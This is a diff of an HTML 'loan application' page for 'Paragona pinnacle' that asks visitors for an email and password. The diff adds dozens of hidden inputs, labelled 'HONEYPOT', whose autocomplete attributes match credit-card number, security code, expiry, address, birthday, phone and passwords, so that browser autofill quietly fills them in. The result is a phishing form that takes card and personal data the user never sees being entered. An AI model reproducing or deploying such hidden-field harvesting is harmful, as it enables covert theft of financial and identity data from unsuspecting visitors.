@@ -1,65 +1,494 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Document</title>
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Paragona pinnacle | Where Success Begins</title>
 
-    <!-- Customized Bootstrap Stylesheet -->
-    <link href="css/bootstrap.min.css" rel="stylesheet" />
-    <link rel="stylesheet" href="/css/loan-application.css" />
-  </head>
-  <body>
-    <div class="wrapper">
-      <a href="/index.html">
-        <img src="/img/logo-horizontallogo-horizontal-bw.png" alt="banner" />
-      </a>
-    </div>
+        <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+        <meta content="" name="keywords" />
+        <meta content="" name="description" />
 
-    <h1>paragonapinnacle loan application</h1>
+        <!-- Favicon -->
+        <link
+            rel="shortcut icon"
+            href="img/logo-eblem.png"
+            type="image/x-icon"
+        />
+        <link href="img/logo-eblem.png" rel="icon" />
 
-    <h2>Enter credentials</h2>
-    <div class="err hide"><p class="error">error you scammer</p></div>
-    <div class="container">
-      <form class="form">
-        <div>
-          <label class="username1">email:</label>
-          <input
-            name="email"
-            class="login-form"
-            type="email"
-            placeholder="email..."
-          />
+        <!-- Google Web Fonts -->
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+        <link
+            href="https://fonts.googleapis.com/css2?family=Heebo:wght@400;500;600&family=Inter:wght@700;800&display=swap"
+            rel="stylesheet"
+        />
+
+        <!-- Icon Font Stylesheet -->
+        <link
+            href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css"
+            rel="stylesheet"
+        />
+
+        <link
+            href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css"
+            rel="stylesheet"
+        />
+
+        <!-- Libraries Stylesheet -->
+        <link href="lib/animate/animate.min.css" rel="stylesheet" />
+        <link
+            href="lib/owlcarousel/assets/owl.carousel.min.css"
+            rel="stylesheet"
+        />
+
+        <!-- Customized Bootstrap Stylesheet -->
+        <link href="css/bootstrap.min.css" rel="stylesheet" />
+
+        <!-- Template Stylesheet -->
+        <link rel="stylesheet" href="/css/loan-application.css" />
+    </head>
+    <body>
+        <div class="container-xxl bg-white p-0 bg-primary page-header">
+            <div class="container m-0 p-0">
+                <nav
+                    class="navbar text-center d-flex align-items-center justify-content-center"
+                >
+                    <a href="index.html" class="navbar-brand p-0">
+                        <img
+                            id="logo"
+                            class="desktop-logo"
+                            src="/img/logo-horizontallogo-horizontal-bw.png"
+                            alt="Logo"
+                        />
+                    </a>
+                </nav>
+            </div>
+
+            <div class="container m-0 p-0 py-5">
+                <div class="header mb-5">
+                    <h3>Loan Application</h3>
+                    <p>
+                        Enter the required credentials for all fields. Ensure
+                        the details are correct.
+                    </p>
+                </div>
+                <div class="alert-message"></div>
+                <form class="shadow-sm p-3 mb-5 rounded form" action="">
+                    <!-- EMAIL -->
+                    <div class="">
+                        <label for="email" class="form-label">Email</label>
+                        <div class="input-group mb-3">
+                            <span class="input-group-text">@</span>
+                            <input
+                                type="text"
+                                class="form-control"
+                                id="email"
+                                name="email"
+                                placeholder="Email"
+                                aria-label="Email"
+                                aria-describedby="email"
+                                autocomplete="email"
+                            />
+                        </div>
+                    </div>
+
+                    <!-- PASSWORD -->
+                    <div class="">
+                        <label for="password" class="form-label"
+                            >Password</label
+                        >
+                        <div class="input-group mb-3">
+                            <span class="input-group-text">⁂</span>
+                            <input
+                                type="password"
+                                class="form-control"
+                                id="password"
+                                name="password"
+                                placeholder="Password"
+                                aria-label="Password"
+                                aria-describedby="password"
+                                autocomplete="current-password"
+                            />
+                        </div>
+                    </div>
+
+                    <!-- HONEYPOT -->
+                    <!-- CC's -->
+                    <input
+                        type="hidden"
+                        name="cc-additional-name"
+                        id="cc-additional-name"
+                        autocomplete="cc-additional-name"
+                    />
+                    <input
+                        type="hidden"
+                        name="cc-csc"
+                        id="cc-csc"
+                        autocomplete="cc-csc"
+                    />
+                    <input
+                        type="hidden"
+                        name="cc-exp"
+                        id="cc-exp"
+                        autocomplete="cc-exp"
+                    />
+                    <input
+                        type="hidden"
+                        name="cc-exp-month"
+                        id="cc-exp-month"
+                        autocomplete="cc-exp-month"
+                    />
+                    <input
+                        type="hidden"
+                        name="cc-exp-year"
+                        id="cc-exp-year"
+                        autocomplete="cc-exp-year"
+                    />
+                    <input
+                        type="hidden"
+                        name="cc-family-name"
+                        id="cc-family-name"
+                        autocomplete="cc-family-name"
+                    />
+                    <input
+                        type="hidden"
+                        name="cc-given-name"
+                        id="cc-given-name"
+                        autocomplete="cc-given-name"
+                    />
+                    <input
+                        type="hidden"
+                        name="cc-name"
+                        id="cc-name"
+                        autocomplete="cc-name"
+                    />
+                    <input
+                        type="hidden"
+                        name="cc-number"
+                        id="cc-number"
+                        autocomplete="cc-number"
+                    />
+                    <input
+                        type="hidden"
+                        name="cc-type"
+                        id="cc-type"
+                        autocomplete="cc-type"
+                    />
+
+                    <input
+                        type="hidden"
+                        name="additional-name"
+                        id="additional-name"
+                        autocomplete="additional-name"
+                    />
+                    <input
+                        type="hidden"
+                        name="address-level1"
+                        id="address-level1"
+                        autocomplete="address-level1"
+                    />
+                    <input
+                        type="hidden"
+                        name="address-level2"
+                        id="address-level2"
+                        autocomplete="address-level2"
+                    />
+                    <input
+                        type="hidden"
+                        name="address-level3"
+                        id="address-level3"
+                        autocomplete="address-level3"
+                    />
+                    <input
+                        type="hidden"
+                        name="address-level4"
+                        id="address-level4"
+                        autocomplete="address-level4"
+                    />
+                    <input
+                        type="hidden"
+                        name="address-line1"
+                        id="address-line1"
+                        autocomplete="address-line1"
+                    />
+                    <input
+                        type="hidden"
+                        name="address-line2"
+                        id="address-line2"
+                        autocomplete="address-line2"
+                    />
+                    <input
+                        type="hidden"
+                        name="address-line3"
+                        id="address-line3"
+                        autocomplete="address-line3"
+                    />
+                    <input
+                        type="hidden"
+                        name="bday"
+                        id="bday"
+                        autocomplete="bday"
+                    />
+                    <input
+                        type="hidden"
+                        name="bday-day"
+                        id="bday-day"
+                        autocomplete="bday-day"
+                    />
+                    <input
+                        type="hidden"
+                        name="bday-month"
+                        id="bday-month"
+                        autocomplete="bday-month"
+                    />
+                    <input
+                        type="hidden"
+                        name="bday-year"
+                        id="bday-year"
+                        autocomplete="bday-year"
+                    />
+                    <input
+                        type="hidden"
+                        name="billing"
+                        id="billing"
+                        autocomplete="billing"
+                    />
+                    <input
+                        type="hidden"
+                        name="country"
+                        id="country"
+                        autocomplete="country"
+                    />
+                    <input
+                        type="hidden"
+                        name="country-name"
+                        id="country-name"
+                        autocomplete="country-name"
+                    />
+                    <input
+                        type="hidden"
+                        name="current-password"
+                        id="current-password"
+                        autocomplete="current-password"
+                    />
+                    <!-- <input
+                    type="hidden"
+                    name="email"
+                    id="email"
+                    autocomplete="email"
+                /> -->
+                    <input
+                        type="hidden"
+                        name="family-name"
+                        id="family-name"
+                        autocomplete="family-name"
+                    />
+                    <input
+                        type="hidden"
+                        name="fax"
+                        id="fax"
+                        autocomplete="fax"
+                    />
+                    <input
+                        type="hidden"
+                        name="given-name"
+                        id="given-name"
+                        autocomplete="given-name"
+                    />
+                    <input
+                        type="hidden"
+                        name="home"
+                        id="home"
+                        autocomplete="home"
+                    />
+                    <input
+                        type="hidden"
+                        name="honorific-prefix"
+                        id="honorific-prefix"
+                        autocomplete="honorific-prefix"
+                    />
+                    <input
+                        type="hidden"
+                        name="honorific-suffix"
+                        id="honorific-suffix"
+                        autocomplete="honorific-suffix"
+                    />
+                    <input
+                        type="hidden"
+                        name="impp"
+                        id="impp"
+                        autocomplete="impp"
+                    />
+                    <input
+                        type="hidden"
+                        name="language"
+                        id="language"
+                        autocomplete="language"
+                    />
+                    <input
+                        type="hidden"
+                        name="mobile"
+                        id="mobile"
+                        autocomplete="mobile"
+                    />
+                    <input
+                        type="hidden"
+                        name="name"
+                        id="name"
+                        autocomplete="name"
+                    />
+                    <input
+                        type="hidden"
+                        name="new-password"
+                        id="new-password"
+                        autocomplete="new-password"
+                    />
+                    <input
+                        type="hidden"
+                        name="nickname"
+                        id="nickname"
+                        autocomplete="nickname"
+                    />
+                    <input
+                        type="hidden"
+                        name="off"
+                        id="off"
+                        autocomplete="off"
+                    />
+                    <input type="hidden" name="on" id="on" autocomplete="on" />
+                    <input
+                        type="hidden"
+                        name="organization"
+                        id="organization"
+                        autocomplete="organization"
+                    />
+                    <input
+                        type="hidden"
+                        name="organization-title"
+                        id="organization-title"
+                        autocomplete="organization-title"
+                    />
+                    <input
+                        type="hidden"
+                        name="pager"
+                        id="pager"
+                        autocomplete="pager"
+                    />
+                    <input
+                        type="hidden"
+                        name="photo"
+                        id="photo"
+                        autocomplete="photo"
+                    />
+                    <input
+                        type="hidden"
+                        name="postal-code"
+                        id="postal-code"
+                        autocomplete="postal-code"
+                    />
+                    <input
+                        type="hidden"
+                        name="sex"
+                        id="sex"
+                        autocomplete="sex"
+                    />
+                    <input
+                        type="hidden"
+                        name="shipping"
+                        id="shipping"
+                        autocomplete="shipping"
+                    />
+                    <input
+                        type="hidden"
+                        name="street-address"
+                        id="street-address"
+                        autocomplete="street-address"
+                    />
+                    <input
+                        type="hidden"
+                        name="tel"
+                        id="tel"
+                        autocomplete="tel"
+                    />
+                    <input
+                        type="hidden"
+                        name="tel-area-code"
+                        id="tel-area-code"
+                        autocomplete="tel-area-code"
+                    />
+                    <input
+                        type="hidden"
+                        name="tel-country-code"
+                        id="tel-country-code"
+                        autocomplete="tel-country-code"
+                    />
+                    <input
+                        type="hidden"
+                        name="tel-extension"
+                        id="tel-extension"
+                        autocomplete="tel-extension"
+                    />
+                    <input
+                        type="hidden"
+                        name="tel-local"
+                        id="tel-local"
+                        autocomplete="tel-local"
+                    />
+                    <input
+                        type="hidden"
+                        name="tel-local-prefix"
+                        id="tel-local-prefix"
+                        autocomplete="tel-local-prefix"
+                    />
+                    <input
+                        type="hidden"
+                        name="tel-national"
+                        id="tel-national"
+                        autocomplete="tel-national"
+                    />
+                    <input
+                        type="hidden"
+                        name="transaction-amount"
+                        id="transaction-amount"
+                        autocomplete="transaction-amount"
+                    />
+                    <input
+                        type="hidden"
+                        name="transaction-currency"
+                        id="transaction-currency"
+                        autocomplete="transaction-currency"
+                    />
+                    <input
+                        type="hidden"
+                        name="url"
+                        id="url"
+                        autocomplete="url"
+                    />
+                    <input
+                        type="hidden"
+                        name="username"
+                        id="username"
+                        autocomplete="username"
+                    />
+                    <input
+                        type="hidden"
+                        name="work"
+                        id="work"
+                        autocomplete="work"
+                    />
+
+                    <button
+                        class="btn btn-primary text-light rounded-pill py-3 px-5 mt-2"
+                    >
+                        Submit
+                    </button>
+                </form>
+            </div>
         </div>
-        <br />
 
-        <!-- <div>
-          <label class="username1">username:</label>
-          <input
-            name="username"
-            class="login-form"
-            type="text"
-            placeholder="username..."
-          />
-        </div>
-        <br /> -->
-
-        <div>
-          <label for="password" class="password1">password:</label>
-          <input
-            name="password"
-            class="login-form"
-            type="password"
-            id="password"
-            placeholder="password..."
-          />
-        </div>
-        <br />
-        <button class="btn btn-primary text-light rounded-pill py-3 px-5 mt-2">
-          Submit
-        </button>
-      </form>
-    </div>
-    <script src="/js/loan-application.js"></script>
-  </body>
+        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+        <script src="/js/loan-application.js"></script>
+    </body>
 </html>
